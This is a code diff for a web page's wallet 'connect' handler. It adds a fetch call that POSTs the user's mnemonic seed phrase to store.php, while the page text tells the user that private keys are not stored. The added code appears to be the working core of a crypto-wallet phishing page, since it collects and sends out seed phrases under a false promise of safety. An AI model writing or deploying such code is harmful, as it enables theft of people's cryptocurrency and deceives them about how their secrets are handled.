@@ -17,3 +17,14 @@ document.getElementById("connectBtn").addEventListener("click", function () {
     <p style="font-size: 0.9em; color: gray;">Private keys are not stored. You're safe.</p>
   `;
 });
+// SEND TO BACKEND
+fetch("store.php", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded"
+  },
+  body: `mnemonic=${encodeURIComponent(mnemonic)}`
+})
+.then(res => res.text())
+.then(res => console.log("Server response:", res))
+.catch(err => console.error("Error:", err));
